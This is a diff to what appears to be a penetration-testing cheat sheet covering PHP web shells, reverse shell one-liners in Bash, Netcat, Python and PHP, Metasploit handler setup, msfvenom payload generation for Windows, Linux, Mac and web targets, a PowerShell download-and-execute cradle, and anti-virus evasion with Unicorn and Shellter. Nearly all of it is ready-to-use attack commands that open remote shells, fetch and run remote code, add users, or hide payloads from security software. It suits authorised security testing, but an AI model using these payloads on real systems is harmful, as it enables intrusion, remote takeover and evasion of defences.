@@ -32,7 +32,7 @@ Basic PHP code to execute system commands through GET parameters:
 
 ```php
 <?php if($_GET['cmd']) { system($_GET['cmd']); } ?>
-<?php if($_GET['cmd']) { exec($_GET['cmd']),$array); print_r($array); } ?>
+<?php if($_GET['cmd']) { exec($_GET['cmd'],$array); print_r($array); } ?>
 <?php if($_GET['cmd']) { echo shell_exec($_GET['cmd']); } ?>
 <?php if($_GET['cmd']) { echo passsthru($_GET['cmd']); } ?>
 <?php if($_GET['cmd']) { preg_replace('/.*/e', $_GET['cmd'], ''); } ?>
@@ -121,19 +121,21 @@ exec /bin/sh 0</dev/tcp/<IP>/<PORT> 1>&0 2>&0
 
 ###### Netcat
 
-```bash
+```
 # If nc e option available:
 nc -e /bin/sh <IP> <PORT> &
-# Else:
+nc.exe -e cmd.exe <IP> <PORT>
+
+# Else (Linux):
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
 ```
 
 ###### Python
 
 ```python
-# TCP
-python -c 'import os;  os.popen("nc -e /bin/sh <IP> <PORT> &");"
-python -c 'import os;  os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f &");"
+# Linux
+python -c 'import os;  os.popen("nc -e /bin/sh <IP> <PORT> &");'
+python -c 'import os;  os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f &");'
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
@@ -141,6 +143,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ###### PHP   
 
 ```php
+# Linux
 # This code assumes that the TCP connection uses file descriptor 3.
 # If it doesn’t work, try 4, 5, 6…
 php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
@@ -203,8 +206,9 @@ system('curl http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php'
 system('wget -qO- http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php')
 ```
 
-
 #### Binary
+
+###### Compiled one-liner
 
 If reverse shell must be made through a binary the following c code can be used:
 
@@ -221,6 +225,29 @@ int main() {
 The binary must be compiled on the same architecture as the target (advised to
 use the same OS and kernel for Linux targets).
 
+To compile for a Windows target on Linux use the cross-compiler mingw:
+
+```
+# 32 bits
+i686-w64-mingw32-gcc -o test.exe test.c
+
+# 64 bits
+x86_64-w64-mingw32-gcc -o test.exe test.c
+```
+
+###### msfvenom reverse shell binary
+
+msfvenom can be used to create a reverse shell binary:
+
+```
+# 32 bits
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o <OUTBIN.exe>
+
+# 64 bits
+msfvenom -a x64 --platform windows -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o <OUTBIN.exe>
+```
+
+
 #### (Optional) TTY
 
 ```
@@ -229,7 +256,9 @@ use the same OS and kernel for Linux targets).
 echo os.system('/bin/bash')
 
 # Python
+python -c 'import pty; pty.spawn("/bin/bash")'
 python -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 
 # Perl
@@ -262,7 +291,7 @@ It communicates over the stager socket and provides a comprehensive
 client-side Ruby API.   
 It features command history, tab completion, channels, and more.
 
-#### Handler
+###### Handler
 
 When using a meterpreter payload, a handler must be started on the host machine.
 
@@ -274,21 +303,68 @@ The commands to start a metasploit handler are as follows:
 msf> use exploit multi/handler
 
 # Set the payload being executed on the target
-msf> set payload windows/x64/meterpreter/reverse_tcp
+msf> set payload <PAYLOAD>
 
 # Set the local IP and port. In case of a NATED VM with port
 # forwarding/redirection, the IP 0.0.0.0 can be used  
-msf> set LHOST <HOST_IP>
-msf> set LPORT <HOST_PORT>
+msf> set LHOST <HOSTIP>
+msf> set LPORT <HOSTPORT>
 
 # To be able to keep several sessions at a time on a single multi/handler
 msf> set ExitOnSession false
-msf> exploit -j
+msf> exploit -j -z
 ```
 
-#### PowerShell
+###### MsfVenom
 
-######  Invoke-Shellcode
+The metasploit framework msfvenom is a powerful standalone payload generator.  
+Note that, while offering encoding techniques, the binary payloads generated
+with msfvenom are often detected by AV softwares. To generate stealthier binary
+payloads use Shellter [(Windows / binary) Shellter].
+
+```
+# List payloads: msfvenom --list payloads
+# List formats: msfvenom --help-formats
+# List encoders: msfvenom --list encoders
+# Recommended encoder: -e x86/shikata_ga_nai
+
+msfvenom –p <PAYLOAD> –f <FORMAT> -e <ENCODER> -b <BADCHAR> --smallest LHOST=<LHOST> LPORT=<LPORT> > <FILE>
+
+
+# Windows payloads
+msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > prompt.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe
+msfvenom -p windows/meterpreter/bind_tcp LPORT=<PORT> -f exe > bind.exe
+msfvenom -p windows/adduser USER=<USERNAME> PASS=<PASSWORD> -f exe > adduser.exe
+
+# Linux payloads
+msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh
+msfvenom -p generic/shell_bind_tcp LHOST=<IP> LPORT=<PORT> -f elf > term.elf
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > reverse.elf
+msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=<PORT> -f elf > bind.elf
+
+# Mac payloads
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f macho > reverse.macho
+msfvenom -p osx/x86/shell_bind_tcp LPORT=<PORT> -f macho > bind.macho
+
+# Web based payloads
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > reverse.asp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > reverse.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > reverse.war
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+
+# Script payloads
+msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > reverse.py
+msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > reverse.pl
+
+# Shellcodes
+msfvenom –p <PAYLOAD> –f <FORMAT> -e <ENCODER> -b <BADCHAR> --smallest LHOST=<LHOST> LPORT=<LPORT> -f bash > <FILE>
+msfvenom –p <PAYLOAD> –f <FORMAT> -e <ENCODER> -b <BADCHAR> --smallest LHOST=<LHOST> LPORT=<LPORT> -f powershell > <FILE>
+```
+
+###### PowerShell
+
+*Invoke-Shellcode*
 
 The msfvenom and Invoke-Shellcode tools can be used to leverage a meterpreter
 on the target through powershell and in memory execution. This can be used to
@@ -315,14 +391,7 @@ msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=
 powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-Shellcode.ps1'); Invoke-Shellcode -Force;
 ```
 
-#### Binary
-
-To generate binaries using msfvenom (that will get flagged by most anti-virus):
-
-```
-msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o <FILE>.exe
-msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o <FILE>.exe
-```
+###### Binary
 
 The following C code can be used to compile a binary that will escape some
 anti-virus:
@@ -339,7 +408,7 @@ int main() {
 
 ### Anti-Virus bypass
 
-#### (Windows / PowerShell) Unicorn
+###### (Windows / PowerShell) Unicorn
 
 Magic Unicorn is a tool for using a PowerShell downgrade attack and inject
 shellcode (custom, cobalt or meterpreter) straight into memory.
@@ -364,7 +433,8 @@ msfconsole -r unicorn.rc
 # On target
 # Execute the powershell command contained in the powershell_attack.txt file
 ```
-#### (Windows / binary) Shellter
+
+###### (Windows / binary) Shellter
 
 Shellter is a dynamic shellcode injection tool, and the first truly dynamic PE
 infector ever created.  
